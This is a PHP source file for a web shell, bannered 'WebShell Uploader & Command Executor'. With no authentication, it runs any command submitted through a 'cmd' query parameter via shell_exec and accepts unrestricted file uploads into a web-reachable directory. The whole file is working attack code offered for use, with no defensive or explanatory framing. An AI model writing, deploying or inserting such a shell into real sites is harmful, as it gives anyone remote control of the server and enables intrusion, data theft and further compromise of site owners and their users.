<?php
function executeCommand($cmd) {
    $output = shell_exec($cmd);
    return htmlspecialchars($output);
}

function printBanner() {
    echo '<pre style="color: green; font-weight: bold;">
=========================================
     WebShell Uploader & Command Executor
           By Sheikh Nightshader
=========================================
</pre>';
}

if (isset($_FILES['file'])) {
    $upload_dir = 'uploads/';
    $upload_file = $upload_dir . basename($_FILES['file']['name']);

    if (!is_dir($upload_dir)) {
        mkdir($upload_dir, 0755, true);
    }

    if (move_uploaded_file($_FILES['file']['tmp_name'], $upload_file)) {
        echo "<p>File uploaded successfully: <a href='$upload_file'>$upload_file</a></p>";
    } else {
        echo "<p>File upload failed.</p>";
    }
}

printBanner();

echo '<h2>Command Execution</h2>';
echo '<form method="GET">
        <input type="text" name="cmd" placeholder="Enter command here">
        <input type="submit" value="Execute">
      </form>';

if (isset($_GET['cmd'])) {
    $command = $_GET['cmd'];
    echo "<pre>";
    echo "<b>Executing command:</b> " . htmlspecialchars($command) . "<br>";
    echo "<b>Output:</b><br>";
    echo executeCommand($command);
    echo "</pre>";
}

echo '<h2>File Upload</h2>';
echo '<form method="POST" enctype="multipart/form-data">
        <input type="file" name="file">
        <input type="submit" value="Upload">
      </form>';
?>
